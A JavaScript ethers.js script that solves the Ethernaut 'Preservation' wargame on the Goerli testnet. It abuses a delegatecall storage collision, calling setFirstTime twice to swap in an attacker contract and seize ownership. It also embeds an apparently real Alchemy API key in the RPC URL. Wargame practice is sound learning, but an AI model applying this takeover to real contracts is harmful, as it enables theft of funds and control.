const { ethers } = require("ethers");
const fs = require("fs-extra");
require("dotenv").config();

async function main() {
  const provider = new ethers.providers.JsonRpcProvider(
    "https://eth-goerli.g.alchemy.com/v2/NW7PWVbJEDvetNwwfXGraE71PLMqeBrw"
  );

  let signer = new ethers.Wallet(process.env.PRIVATE_KEY, provider);
  const abi = fs.readFileSync(
    "./Ethernauts_abi_bin/contracts_Preservation_Preservation_sol_Preservation.abi",
    "utf8"
  );

  const preservation = new ethers.Contract(
    "0x334CE72264469756b0239599dC8A6f451caA1aaA",
    abi,
    signer
  );
  console.log("...");
  // start to interact with a contract
  // First I call the function with my contract address to set library1 address to my Attacker contract address
  const callsetfirst = await preservation.setFirstTime(
    "0x819daaC96DfCC10Ea2779222dfB9E0E563AE23CC"
  );
  await callsetfirst.wait(1);
  console.log(await preservation.owner());
  console.log(await preservation.timeZone1Library());
  // after I set the library address to my attacker address, I call this function again to set owner to my acc address
  const callsetsecond = await preservation.setFirstTime(
    "0xEE4C6578F5AB9B07b9599Ac51c84a83BB264AAfe",
    { gasLimit: 12450000 }
  );
  await callsetsecond.wait(1);
  console.log("...");
  console.log(await preservation.owner());
  console.log(await preservation.timeZone1Library());
}

main()
  .then(() => process.exit(0))
  .catch((error) => {
    console.error(error);
    process.exit(1);
  });
